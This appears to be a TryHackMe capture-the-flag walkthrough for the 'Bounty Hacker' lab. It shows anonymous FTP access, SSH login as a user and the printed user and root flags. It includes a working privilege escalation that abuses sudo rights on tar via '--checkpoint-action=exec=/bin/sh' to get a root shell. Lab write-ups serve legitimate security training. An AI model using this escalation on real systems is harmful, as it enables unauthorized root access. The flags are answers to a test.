


```
ftp 10.10.152.92
Connected to 10.10.152.92.
220 (vsFTPd 3.0.3)
Name (10.10.152.92:nisha): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||54426|)

  ftp: Can't connect to `10.10.152.92:54426': Connection timed out
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp>
ftp>   mget *
mget locks.txt [anpqy?]? y
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for locks.txt (418 bytes).
100% |********************************|   418        6.31 KiB/s    00:00 ETA
226 Transfer complete.
418 bytes received in 00:00 (1.53 KiB/s)
mget task.txt [anpqy?]? y
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |********************************|    68      233.82 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.35 KiB/s)
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
ftp> less task.txt
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin

```


[Gtfobins](https://gtfobins.github.io/gtfobins/tar/)

```
ssh lin@10.10.152.92
The authenticity of host '10.10.152.92 (10.10.152.92)' can't be established.
ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.152.92' (ED25519) to the list of known hosts.
lin@10.10.152.92's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}
lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin:
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
lin@bountyhacker:~/Desktop$ tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
$ whoami
lin
$ tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: option '--checkpo' is ambiguous; possibilities: '--checkpoint' '--checkpoint-action'
Try 'tar --help' or 'tar --usage' for more information.
$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
# cd root
/bin/sh: 2: cd: can't cd to root
# ls
user.txt
# cd /root
# ls
root.txt
# cat root.txt
THM{80UN7Y_h4cK3r}
#

```
Who wrote the task list?
```


```

What service can you bruteforce with the text file found?

```


```

What is the users password?

```

```

user.txt

```


```
root.txt

```

```
